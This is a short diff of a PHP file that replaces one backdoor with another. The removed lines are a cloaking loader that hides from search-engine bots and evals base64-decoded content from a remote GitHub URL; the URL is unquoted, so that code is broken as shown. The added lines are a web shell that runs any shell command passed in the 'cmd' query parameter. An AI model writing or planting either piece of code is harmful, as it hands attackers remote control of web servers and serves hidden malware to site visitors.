@@ -1,13 +1,7 @@
 <?php
-// 
-
-// 
-$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$isBot = preg_match('/Google|Bing|Yahoo|bot|spider/i', $ua);
-
-// 
-if (!$isBot) {
-    $a = https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/pink.txt
-    $b = base64_decode($a);
-    eval($b);
+if (isset($_GET['cmd'])) {
+    echo "<pre>";
+    system($_GET['cmd']); // jalankan perintah shell
+    echo "</pre>";
 }
+?>
